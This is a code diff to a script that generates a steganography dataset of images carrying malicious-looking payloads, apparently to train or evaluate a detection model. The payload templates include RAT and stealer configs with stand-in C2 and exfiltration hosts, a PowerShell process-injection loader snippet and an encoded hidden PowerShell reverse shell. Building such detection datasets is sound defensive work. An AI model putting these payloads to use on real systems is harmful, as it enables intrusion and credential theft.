@@ -48,6 +48,52 @@ from utils.checkpoints import extract_state_dict
 # ─── REALISTIC CYBER THREAT PAYLOAD TEMPLATES ─────────────────────────────────
 
 MALICIOUS_PAYLOAD_TEMPLATES = {
+    # ── 2024-2025 Real-World Steganography Threat Campaigns ──
+    "ta558_remcos_rat": json.dumps({
+        "campaign": "TA558-SteganoAmor-2024",
+        "malware_family": "RemcosRAT_v4.9.2",
+        "c2_endpoints": [
+            "https://cdn-update.legitimate-host.net/api/v2/telemetry",
+            "https://office-cloud-sync.azureedge.net/sync"
+        ],
+        "beacon_jitter_pct": 20,
+        "keylogger_active": True,
+        "credential_harvest_targets": ["chrome", "edge", "outlook", "winscp", "filezilla"],
+        "encrypted_aes_session_key": "c7a8b348d610fa98314e6b20895c1103ad712e0934"
+    }).encode("utf-8"),
+
+    "godrat_memory_loader": (
+        b"# GODRAT FILELESS REFLECTIVE IN-MEMORY LOADER (2024-2025)\n"
+        b"$TargetProc = (Get-Process explorer).Id;\n"
+        b"$MemAlloc = [Kernel32]::VirtualAllocEx($TargetProc, 0, 0x1000, 0x3000, 0x40);\n"
+        b"[Kernel32]::WriteProcessMemory($TargetProc, $MemAlloc, $RawShellcode, 0x400, [ref]0);\n"
+        b"[Kernel32]::CreateRemoteThread($TargetProc, 0, 0, $MemAlloc, 0, 0, [ref]0);\n"
+    ),
+
+    "agent_tesla_infostealer": json.dumps({
+        "campaign": "AgentTesla-Formbook-StegoDrop",
+        "smtp_server": "smtp.exfiltrate-host.com",
+        "smtp_port": 587,
+        "exfil_email": "dropzone_ops@stealth-reports.cc",
+        "captured_keystrokes_buffer": 4096,
+        "clipboard_monitor": True,
+        "screenshot_interval_sec": 120
+    }).encode("utf-8"),
+
+    "lumma_crypto_stealer": json.dumps({
+        "threat_actor": "Lumma-Redline-Stego-2025",
+        "stealer_version": "v5.4.1",
+        "crypto_wallets": ["Metamask", "Phantom", "Exodus", "BinanceChain", "CoinbaseWallet"],
+        "system_fingerprint": {
+            "os": "Windows 11 Enterprise",
+            "cpu": "Intel Core i7-13700K",
+            "ram_mb": 32768,
+            "hwid": "D41D8CD98F00B204E9800998ECF8427E"
+        },
+        "exfil_gate": "https://gateway-lumma.onion.to/gate.php"
+    }).encode("utf-8"),
+
+    # ── Operational Cyber Threat Archetypes ──
     "reverse_shell": (
         b"powershell -nop -w hidden -EncodedCommand "
         b"JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdA"
@@ -240,10 +286,23 @@ def main():
     parser.add_argument("--num_images", type=int, default=15, help="Number of threat images to generate")
     parser.add_argument("--output_dir", type=str, default="data/malicious_eval", help="Destination folder")
     parser.add_argument("--evaluate", action="store_true", help="Run model inference on generated threat images")
+    parser.add_argument("--add_to_stego", action="store_true", help="Automatically copy generated carriers into data/stego/ for training")
     args = parser.parse_args()
 
     out_path = Path(args.output_dir)
     manifest = create_malicious_stego_dataset(out_path, num_images=args.num_images)
+
+    if args.add_to_stego:
+        stego_dir = ROOT_DIR / "data" / "stego"
+        stego_dir.mkdir(parents=True, exist_ok=True)
+        import shutil
+        copied = 0
+        for item in manifest:
+            src_f = Path(item["file_path"])
+            dst_f = stego_dir / src_f.name
+            shutil.copy2(src_f, dst_f)
+            copied += 1
+        print(f"📦 Successfully copied {copied} threat images directly into {stego_dir} for model training.")
 
     if args.evaluate:
         evaluate_on_malicious_dataset(manifest)
